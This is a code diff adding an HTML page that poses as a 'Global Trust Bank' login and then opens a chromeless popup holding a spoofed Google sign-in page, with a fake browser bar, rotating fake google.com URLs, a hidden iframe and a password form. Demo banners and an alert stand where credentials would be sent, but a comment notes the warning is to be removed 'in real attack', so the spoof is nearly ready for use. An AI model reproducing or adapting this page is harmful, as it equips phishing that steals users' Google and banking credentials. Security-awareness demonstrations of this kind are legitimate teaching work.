@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Banking Portal</title>
+    <meta charset="UTF-8">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #1a237e 0%, #311b92 100%);
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            color: #333;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .bank-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        
+        .logo-icon {
+            font-size: 42px;
+            color: #4CAF50;
+        }
+        
+        .bank-name {
+            font-size: 28px;
+            font-weight: 700;
+            color: #1a237e;
+        }
+        
+        .security-badge {
+            display: inline-block;
+            background: #4CAF50;
+            color: white;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            margin: 15px 0;
+            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
+        }
+        
+        .message {
+            color: #666;
+            line-height: 1.6;
+            margin: 20px 0;
+            font-size: 16px;
+        }
+        
+        .login-button {
+            background: linear-gradient(135deg, #2196F3 0%, #1976D2 100%);
+            color: white;
+            border: none;
+            padding: 18px 45px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 25px 0;
+            box-shadow: 0 6px 20px rgba(33, 150, 243, 0.3);
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .login-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(33, 150, 243, 0.4);
+            background: linear-gradient(135deg, #1976D2 0%, #0d47a1 100%);
+        }
+        
+        .login-button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        
+        .url-display {
+            background: #f5f5f5;
+            border: 2px solid #e0e0e0;
+            padding: 15px;
+            border-radius: 10px;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 14px;
+            color: #0d47a1;
+            margin: 20px 0;
+            text-align: center;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+        
+        .trust-indicators {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 25px;
+            flex-wrap: wrap;
+        }
+        
+        .indicator {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .warning {
+            background: #fff8e1;
+            border: 1px solid #ffd54f;
+            color: #ff6f00;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 25px;
+            font-size: 13px;
+            text-align: left;
+            display: none;
+        }
+        
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #2196F3;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            vertical-align: middle;
+            margin-left: 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .progress-bar {
+            height: 4px;
+            background: #e0e0e0;
+            border-radius: 2px;
+            margin: 20px 0;
+            overflow: hidden;
+            display: none;
+        }
+        
+        .progress {
+            height: 100%;
+            background: #4CAF50;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="bank-logo">
+            <div class="logo-icon">🏦</div>
+            <div class="bank-name">Global Trust Bank</div>
+        </div>
+        
+        <div class="security-badge">
+            🔐 SECURE CONNECTION VERIFIED
+        </div>
+        
+        <h2 style="color: #1a237e; margin-bottom: 15px;">Online Banking Login</h2>
+        
+        <div class="message">
+            For your security, we're redirecting you to our enhanced authentication system.
+            Please click the button below to continue securely.
+        </div>
+        
+        <div class="url-display" id="urlDisplay">
+            https://secure.gtb.com/online-banking
+        </div>
+        
+        <button class="login-button" id="loginBtn">
+            <span style="font-size: 20px;">→</span>
+            Proceed to Secure Login
+        </button>
+        
+        <div class="progress-bar" id="progressBar">
+            <div class="progress" id="progress"></div>
+        </div>
+        
+        <div class="trust-indicators">
+            <div class="indicator">✅ 256-bit Encryption</div>
+            <div class="indicator">✅ SSL/TLS 1.3</div>
+            <div class="indicator">✅ PCI DSS Compliant</div>
+            <div class="indicator">✅ ISO 27001 Certified</div>
+        </div>
+        
+        <div class="warning" id="warning">
+            <strong>⚠️ SECURITY NOTICE:</strong> This is a security demonstration page. 
+            Real banks will never ask you to log in through external links. 
+            Always verify the URL in your browser's address bar.
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginBtn').addEventListener('click', function() {
+            const btn = this;
+            const warning = document.getElementById('warning');
+            const progressBar = document.getElementById('progressBar');
+            const progress = document.getElementById('progress');
+            const urlDisplay = document.getElementById('urlDisplay');
+            
+            // Show warning
+            warning.style.display = 'block';
+            
+            // Disable button and show loading
+            btn.disabled = true;
+            btn.innerHTML = '<span>🔒</span> Initializing Secure Connection<span class="loader"></span>';
+            
+            // Show progress bar
+            progressBar.style.display = 'block';
+            
+            // Phase 1: Fake security verification
+            setTimeout(() => {
+                urlDisplay.textContent = 'https://auth.gtb.com/verify-identity';
+                urlDisplay.style.color = '#4CAF50';
+                urlDisplay.style.borderColor = '#4CAF50';
+                progress.style.width = '25%';
+                
+                setTimeout(() => {
+                    urlDisplay.textContent = 'https://secure.gtb.com/2fa-authentication';
+                    progress.style.width = '50%';
+                    
+                    setTimeout(() => {
+                        urlDisplay.textContent = 'https://onlinebanking.gtb.com/session-start';
+                        progress.style.width = '75%';
+                        
+                        // Phase 2: Create spoofed window
+                        setTimeout(() => {
+                            progress.style.width = '100%';
+                            btn.innerHTML = '<span>✅</span> Connection Established';
+                            
+                            // Create new window WITHOUT address bar
+                            const features = `
+                                width=${screen.width * 0.9},
+                                height=${screen.height * 0.9},
+                                left=${screen.width * 0.05},
+                                top=${screen.height * 0.05},
+                                scrollbars=yes,
+                                resizable=yes,
+                                toolbar=no,
+                                menubar=no,
+                                location=no,
+                                directories=no,
+                                status=no
+                            `;
+                            
+                            // Open window (initially blank)
+                            const spoofedWindow = window.open('about:blank', '_blank', features);
+                            
+                            if (spoofedWindow) {
+                                // Write complete spoofed page
+                                spoofedWindow.document.write(`
+                                    <!DOCTYPE html>
+                                    <html>
+                                    <head>
+                                        <title>Google - Accounts</title>
+                                        <meta charset="UTF-8">
+                                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                                        <style>
+                                            * {
+                                                margin: 0;
+                                                padding: 0;
+                                                box-sizing: border-box;
+                                            }
+                                            
+                                            body {
+                                                font-family: 'Google Sans', Arial, sans-serif;
+                                                background: white;
+                                                min-height: 100vh;
+                                            }
+                                            
+                                            /* Fake Google Header */
+                                            .google-header {
+                                                display: flex;
+                                                align-items: center;
+                                                padding: 20px 40px;
+                                                border-bottom: 1px solid #dadce0;
+                                                background: white;
+                                            }
+                                            
+                                            .google-logo {
+                                                font-size: 24px;
+                                                font-weight: bold;
+                                                color: #4285f4;
+                                                margin-right: 40px;
+                                            }
+                                            
+                                            .nav-links {
+                                                display: flex;
+                                                gap: 30px;
+                                            }
+                                            
+                                            .nav-links a {
+                                                text-decoration: none;
+                                                color: #5f6368;
+                                                font-size: 14px;
+                                            }
+                                            
+                                            .nav-links a:hover {
+                                                color: #1a73e8;
+                                            }
+                                            
+                                            /* Fake URL Bar INSIDE page */
+                                            .fake-url-bar {
+                                                background: #f8f9fa;
+                                                padding: 12px 40px;
+                                                border-bottom: 1px solid #dadce0;
+                                                font-family: 'Consolas', monospace;
+                                                font-size: 14px;
+                                                color: #1a73e8;
+                                                display: flex;
+                                                align-items: center;
+                                                gap: 10px;
+                                                box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+                                            }
+                                            
+                                            .lock-icon {
+                                                color: #34a853;
+                                                font-size: 16px;
+                                            }
+                                            
+                                            /* Main Content */
+                                            .login-container {
+                                                max-width: 450px;
+                                                margin: 60px auto;
+                                                padding: 50px;
+                                                border: 1px solid #dadce0;
+                                                border-radius: 8px;
+                                            }
+                                            
+                                            .google-account-title {
+                                                text-align: center;
+                                                margin-bottom: 30px;
+                                            }
+                                            
+                                            .google-account-title h1 {
+                                                font-size: 24px;
+                                                color: #202124;
+                                                margin-bottom: 10px;
+                                            }
+                                            
+                                            .google-account-title p {
+                                                color: #5f6368;
+                                                font-size: 16px;
+                                            }
+                                            
+                                            .avatar {
+                                                width: 80px;
+                                                height: 80px;
+                                                background: #4285f4;
+                                                border-radius: 50%;
+                                                margin: 0 auto 20px;
+                                                display: flex;
+                                                align-items: center;
+                                                justify-content: center;
+                                                color: white;
+                                                font-size: 32px;
+                                                font-weight: bold;
+                                            }
+                                            
+                                            input {
+                                                width: 100%;
+                                                padding: 15px;
+                                                margin: 10px 0;
+                                                border: 1px solid #dadce0;
+                                                border-radius: 4px;
+                                                font-size: 16px;
+                                            }
+                                            
+                                            .login-btn {
+                                                width: 100%;
+                                                background: #1a73e8;
+                                                color: white;
+                                                border: none;
+                                                padding: 15px;
+                                                border-radius: 4px;
+                                                font-size: 16px;
+                                                font-weight: 600;
+                                                cursor: pointer;
+                                                margin: 20px 0;
+                                            }
+                                            
+                                            .login-btn:hover {
+                                                background: #1669d6;
+                                            }
+                                            
+                                            .help-links {
+                                                text-align: center;
+                                                margin-top: 20px;
+                                            }
+                                            
+                                            .help-links a {
+                                                color: #1a73e8;
+                                                text-decoration: none;
+                                                font-size: 14px;
+                                                margin: 0 10px;
+                                            }
+                                            
+                                            /* Fake Browser Chrome */
+                                            .browser-top-bar {
+                                                background: #f1f3f4;
+                                                padding: 8px 15px;
+                                                display: flex;
+                                                align-items: center;
+                                                gap: 10px;
+                                                border-bottom: 1px solid #dadce0;
+                                            }
+                                            
+                                            .browser-button {
+                                                width: 12px;
+                                                height: 12px;
+                                                border-radius: 50%;
+                                            }
+                                            
+                                            .browser-button.close { background: #ff5f57; }
+                                            .browser-button.minimize { background: #ffbd2e; }
+                                            .browser-button.maximize { background: #28ca42; }
+                                            
+                                            /* Hidden frame for actual Google */
+                                            .hidden-frame {
+                                                position: absolute;
+                                                width: 100%;
+                                                height: calc(100% - 140px);
+                                                bottom: 0;
+                                                border: none;
+                                                opacity: 0;
+                                                pointer-events: none;
+                                            }
+                                            
+                                            /* Demo warning */
+                                            .demo-warning {
+                                                background: #fce8e6;
+                                                border: 1px solid #f28b82;
+                                                color: #c5221f;
+                                                padding: 20px;
+                                                margin: 20px;
+                                                border-radius: 8px;
+                                                font-size: 14px;
+                                                position: absolute;
+                                                bottom: 20px;
+                                                left: 20px;
+                                                right: 20px;
+                                                z-index: 10000;
+                                            }
+                                        </style>
+                                        <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+                                    </head>
+                                    <body>
+                                        <!-- Fake Browser Top Bar -->
+                                        <div class="browser-top-bar">
+                                            <div class="browser-button close"></div>
+                                            <div class="browser-button minimize"></div>
+                                            <div class="browser-button maximize"></div>
+                                        </div>
+                                        
+                                        <!-- Fake URL Bar -->
+                                        <div class="fake-url-bar">
+                                            <span class="lock-icon">🔒</span>
+                                            <span id="dynamicUrl">https://accounts.google.com</span>
+                                        </div>
+                                        
+                                        <!-- Fake Google Header -->
+                                        <div class="google-header">
+                                            <div class="google-logo">Google</div>
+                                            <div class="nav-links">
+                                                <a href="#">Gmail</a>
+                                                <a href="#">Images</a>
+                                                <a href="#">Drive</a>
+                                                <a href="#">Calendar</a>
+                                            </div>
+                                        </div>
+                                        
+                                        <!-- Fake Login Form -->
+                                        <div class="login-container">
+                                            <div class="google-account-title">
+                                                <div class="avatar">G</div>
+                                                <h1>Sign in</h1>
+                                                <p>to continue to Google Accounts</p>
+                                            </div>
+                                            
+                                            <input type="email" placeholder="Email or phone" id="email">
+                                            <input type="password" placeholder="Enter your password" id="password">
+                                            
+                                            <button class="login-btn">Next</button>
+                                            
+                                            <div class="help-links">
+                                                <a href="#">Forgot email?</a>
+                                                <a href="#">Create account</a>
+                                                <a href="#">Privacy</a>
+                                                <a href="#">Terms</a>
+                                            </div>
+                                        </div>
+                                        
+                                        <!-- Hidden iframe with actual Google -->
+                                        <iframe class="hidden-frame" id="realGoogle" 
+                                                src="https://www.google.com"
+                                                sandbox="allow-scripts">
+                                        </iframe>
+                                        
+                                        <!-- Demo Warning (Remove in real attack) -->
+                                        <div class="demo-warning">
+                                            <strong>DEMONSTRATION ONLY:</strong> This is a fake Google login page. 
+                                            In a real phishing attack, this would look identical to the real Google login.
+                                            Check the actual browser address bar - it shows "about:blank" not "google.com".
+                                        </div>
+                                        
+                                        <script>
+                                            // Animate URL changes
+                                            const urls = [
+                                                'https://accounts.google.com',
+                                                'https://myaccount.google.com',
+                                                'https://signin.google.com',
+                                                'https://security.google.com'
+                                            ];
+                                            
+                                            let urlIndex = 0;
+                                            setInterval(() => {
+                                                const urlElement = document.getElementById('dynamicUrl');
+                                                urlElement.style.opacity = '0.7';
+                                                setTimeout(() => {
+                                                    urlElement.textContent = urls[urlIndex];
+                                                    urlElement.style.opacity = '1';
+                                                    urlIndex = (urlIndex + 1) % urls.length;
+                                                }, 200);
+                                            }, 3000);
+                                            
+                                            // Make fake login form "work"
+                                            document.querySelector('.login-btn').addEventListener('click', function(e) {
+                                                e.preventDefault();
+                                                const email = document.getElementById('email').value;
+                                                const password = document.getElementById('password').value;
+                                                
+                                                if(email && password) {
+                                                    this.innerHTML = 'Checking...';
+                                                    this.disabled = true;
+                                                    
+                                                    // Fake validation
+                                                    setTimeout(() => {
+                                                        alert('DEMO: Would send credentials to attacker');
+                                                        this.innerHTML = 'Next';
+                                                        this.disabled = false;
+                                                    }, 1500);
+                                                } else {
+                                                    alert('Please enter both email and password');
+                                                }
+                                            });
+                                            
+                                            // Try to hide warning after 10 seconds
+                                            setTimeout(() => {
+                                                document.querySelector('.demo-warning').style.opacity = '0.5';
+                                            }, 10000);
+                                            
+                                            // Periodically update title (like real Gmail does)
+                                            let titleIndex = 0;
+                                            const titles = [
+                                                'Google - Accounts',
+                                                'Sign in - Google Accounts',
+                                                'Google'
+                                            ];
+                                            
+                                            setInterval(() => {
+                                                document.title = titles[titleIndex];
+                                                titleIndex = (titleIndex + 1) % titles.length;
+                                            }, 5000);
+                                            
+                                            // Try to modify iframe title (won't work cross-origin but attempt anyway)
+                                            setInterval(() => {
+                                                try {
+                                                    document.getElementById('realGoogle').contentDocument.title = 'Google';
+                                                } catch(e) {}
+                                            }, 3000);
+                                        <\/script>
+                                    </body>
+                                    </html>
+                                `);
+                                
+                                // Close the original window after 2 seconds
+                                setTimeout(() => {
+                                    try {
+                                        window.close();
+                                    } catch(e) {
+                                        console.log("Could not close original window");
+                                    }
+                                }, 2000);
+                                
+                                // Final message
+                                setTimeout(() => {
+                                    btn.innerHTML = '<span>✅</span> Redirect Complete';
+                                    warning.innerHTML = '<strong>✅ DEMONSTRATION COMPLETE:</strong> The spoofed window has been created. Note how there is no address bar and the title says "Google - Accounts".';
+                                    warning.style.background = '#e8f5e9';
+                                    warning.style.borderColor = '#4CAF50';
+                                    warning.style.color = '#2e7d32';
+                                }, 3000);
+                            }
+                        }, 1000); // End of final timeout
+                    }, 800); // Phase 1.3
+                }, 800); // Phase 1.2
+            }, 1000); // Phase 1.1
+        });
+        
+        // Animate the URL display periodically
+        setInterval(() => {
+            const urls = [
+                'https://secure.gtb.com/online-banking',
+                'https://online.gtb.com/login',
+                'https://gtb.com/secure-access',
+                'https://banking.gtb.com/portal'
+            ];
+            
+            const urlDisplay = document.getElementById('urlDisplay');
+            const randomUrl = urls[Math.floor(Math.random() * urls.length)];
+            
+            urlDisplay.style.transform = 'scale(0.95)';
+            urlDisplay.style.opacity = '0.7';
+            
+            setTimeout(() => {
+                urlDisplay.textContent = randomUrl;
+                urlDisplay.style.transform = 'scale(1)';
+                urlDisplay.style.opacity = '1';
+            }, 200);
+        }, 5000);
+        
+        // Show warning on page load
+        setTimeout(() => {
+            document.getElementById('warning').style.display = 'block';
+        }, 3000);
+    </script>
+</body>
+</html>
